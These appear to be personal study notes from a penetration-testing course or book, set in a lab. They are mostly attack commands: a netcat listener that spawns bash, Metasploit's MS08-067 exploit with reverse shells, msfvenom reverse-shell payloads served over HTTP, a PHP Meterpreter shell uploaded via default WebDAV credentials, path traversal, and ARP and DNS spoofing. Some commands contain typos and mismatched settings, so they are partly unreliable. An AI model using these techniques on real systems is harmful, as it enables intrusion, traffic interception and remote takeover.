## Netcat

```
# check to see if a port is listening
nc -v 192.168.20.9 80

# listen on a port
nc -lvp 1234

# listen on a port and execute any input using bash
nc -lvp 1234 -e /bin/bash

# connect to a port
nc 192.168.20.9 1234

# sending a file using netcat
# machine 1: setup to listen and redirect any input to a file
nc -lvp 1234 > netcatfile

# machine 2: send a file over the connection:
np 192.168.20.9 1234 < mydirectory/myfile

-l: listen
-v: verbose
-p: port
```

# Metasploit

Going to use Metasploit to exploit an unpatched vulnerability on a Windows XP target. The vulsenerability is patched by Microsoft Security Bulletin MS08-067. Later we will find out how to find potential vulnerabilities on target machines. 

### Metasploit console

```
sudo systemctl start postgresql.service # start the database
msfconsole # starts the console
help # get help 
help <command> # get help on a command

search ms08-067 # built in search for exploit
info exploit/windows/smb/ms08_067_netapi # the path is from the pervious search command

use windows/smb/ms08_067_netapi # loads the exploit module
show options # show options that must be provided to use the exploit
set RHOST 192.168.20.10 # sets the RHOST option
show targets # shows what machines this exploit can attack
show payloads # shows compatible payloads for this attack
exploit # start the exploit
meterpreter > help # help for meterpreter
meterpreter > exit # exit Meterpreter

# Setting reverse shell payload
set payload windows/shell_reverse_tcp
show options # shows new options that must be set for the reverse shell
set LHOST 192.168.20.9 # sets the LHOST option to our attacking machine IP
exploit # start the exploit with the reverse shell payload
```

### Metasploit cli

Run the same exploit as above from the command line.

```
# 1st method:
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 10.0.0.26; set PAYLOAD windows/shell_bind_tcp; set LHOST 10.0.0.190; run"
# 2nd method (LHOST not needed):
msfconsole -x "use windows/smb/ms08_067_netapi; set RHOST 10.0.0.26; set PAYLOAD windows/shell_bind_tcp; run"

```

## Standalong Payloads with Msfvenom

```
msfvenom -h
msfvenom -l payloads # list available payloads
msfvenom -p windows/meterpreter/reverse_tcp # select a payload
msfvenom -p windows/meterpreter/reverse_tcp --list-options # see payload options
msfvenom --list formats # shows output format
# putting it all together:
# creates a reverse terminal payload that connects to port 192.168.20.9:12345
# and the window is a windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
> chapter4example.exe
file chapter4example.exe
```

now we can server the payload via a web server:

```
cp chapter4example.exe /var/www
service apache2 start
# now the payload can be downloaded using a web browser at 
# http://[machine ip]/chapter4example.exe
```

now we need to set up a listener for the reverse connection from the payload:

```
msfconsole # starts the console
use multi/handler # loads the exploit module
set payload windows/meterpreter/reverse_tcp
show options # show options that must be provided to use the exploit
set LHOST 192.168.20.10 # sets the RHOST option
set LPORT 12345
exploit
```

## Using Auxiliary Modules

auxiliary modules are used for tasks other than exploitation. This example is a module that enumerates the listening pipes on an SMB server.

```
msfconsole # starts the console
use scanner/smb/pipe_auditor 
show options
set RHOSTS 192.168.20.10
exploit
```

# Open Source Intelligence Gathering

```
www.netcraft.com

whois bulbsecurity.com

nslookup www.blubsecurity.com

# look for mail servers:
nslookup
set type=mx
bulbsecurity.com

host -t ns zoneedit.com
host -l zoneeddit.com ns2.zoneedit.com

# search for email addresses
theharvester -d bulbsecurity.com -l 500 -b all
```

## Manual Port Scanning

```
nc --vv 192.168.20.10 25

nmap -sS 192.168.20.10-12 -oA bookmap # SYS scan
nmap -sV 192.168.20.10-12 -oA bookversionmap # version scan
nmap -sU 192.168.20.10-12 -oA bookudp # UDP scan
nmap -sS -p 3232 192.168.20.10 # scan a specific port
nmap -sC 192.168.20.10-20 # runs script scan in addition to port scan
```

## Nessus

Vulnerability scanner

```
sudo systemctl start nessusd.service # starts Nessus web server on port 8834
https://[machine IP]:8834 # access Nessus
```

## Nmap Scripting Engine

```
/usr/share/nmap/scripts # location of nmap scripts
nmap --script-help default # help on default scripts
nmap -sC 192.168.20.10-20 # runs script scan in addition to port scan

nmap --script-help nfs-ls # help on a single script
nmap --script=nfs-ls 192.168.20.11 # run a single script

ssh 192.168.20.11 # ssh into a server
```

## Metasploit Scanner Modules

```
service postgresql start # start the database
msfconsole # starts the console
use scanner/ftp/anonymous # looks for anonymous FTP access
set RHOSTS 192.168.20.10-11
exploit
```

## Metasploit Exploit Check Functions

```
service postgresql start # start the database
msfconsole # starts the console
use windows/smb/ms08_067_netapi # loads an exploit
set RHOST 192.168.20.10
check # checks if the target is susceptable to the exploit (does not run the exploit)
# note: not all exploits have checkadmin

```

# Web Application Scanning

## Nikto

```
nikto -h 192.168.20.10 # runs web application vulnerability scanner
```

ad

```
# *** really not sure what this tool is used for??? ***
cadaver http://192.168.20.10/webdav # supply wampp:xampp 
```

Connecting to a web server manually with Netcat

```
nc 192.168.20.10 # connect to web server
GET / HTTP/1.1 # using nc to send a GET request

nc 192.168.20.10 # connect to web server
GET /../../../../../boot.ini HTTP/1.1 # using nc to send a GET request for windows file
```

Using Netcat to verify usernames on a mail server

```
nc 192.168.20.10 25
VRFY georgia
VRFY john

```

# Wireshark

```
wireshark
# wireshark filters:
ip.dst==192.168.20.10
#chain filters:
ip.dst==192.168.20.10 and ftp
```

# ARP Cache Poisoning

The idea is to insert our machine in the middle of two other machines communication. 

Example:

An Ubuntu target and Windows XP target are communicating with each other via FTP. To insert our machine in the middle we send:

1) send a fake ARP reply to Ubuntu saying we are the Windows XP machine. Now when Windows XP sends a packet intended for the Windows XP machine it will really send the packet to our machine.
2) send a fake ARP reply to Windows XP saying we are Ubuntu. Now when Ubuntu sends a packed intended for Windows XP it will really send the packet to our machine.
3)  We turn on IP forwarding on our machine so any packets that are sent to our machine and are not ours are sent out to the proper machine. This way both targets don't lose communication with each other.



![image-20250715165614992](/home/glenn/Documents/PenetrationTesting/screenshots/Screenshot from 2025-07-15 16-56-10.png)



```
wireshark # to capture traffic
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # turn IP forwarding on
sudo arpspoof -i eth0 -t 192.168.20.11 192.168.20.10
sudo arpspoof -i eth0 -t 192.168.20.10 192.168.20.11
# now our attacking machine can monitor traffic between Ubuntu and Windowx XP machines
```

## Impersonating the Default Gateway

```
wireshark # to capture traffic
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # turn IP forwarding on
sudo arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
sudo arpspoof -i eth0 -t 192.168.20.1 192.168.20.11
# now our attacking machine can monitor traffic between Ubuntu and Windowx XP machines
```

 Note: routing all gateway traffic through a single laptop can impact network performance.

# DNS Cache Poisoning

Very similar to ARP spoofing. Spoofs a DNS request to point to an attacking machine.

```
service apache2 start # starts web server on our machine
# create a file that maps our ip address to a web address
cat > hosts.txt
192.168.20.9 www.gmail.com

# routing gateway traffic through our machine
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # turn IP forwarding on
sudo arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
sudo arpspoof -i eth0 -t 192.168.20.1 192.168.20.11

dnsspoof -i eth0 -f hosts.txt
```

# SSL Attacks

page 170

## Exploiting WebDAV Default Credentials

```
# create a test file
cat > test.txt
test

# now use Cadaver to upload the file to WebDAV, login: wampp:xampp
cadaver http://192.168.20.10/webdev
put test.txt

# navigate to 192.168.20.10/webdev/test.txt to see the test file

# create a payload with Msfvenom
msfvenom -l payloads # show payloads
# create a php reserse shell
msfvenom -p php/meterpreter/reverse_tcp -o # displays required options for the payload
# create the payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2323 -f raw > meterpreter.php

# now use cadaver to upload the payload:
put meterpreter.php

# create a console with Metasploit for the reverse shell to connect to:
msfconsole # starts the console
use multi/handler # loads the exploit module
set payload windows/meterpreter/reverse_tcp
show options # show options that must be provided to use the exploit
set LHOST 192.168.20.10 # sets the RHOST option
set LPORT 12345
exploit

# use the Meterpreter command getuid to see our privileges
getuid
```



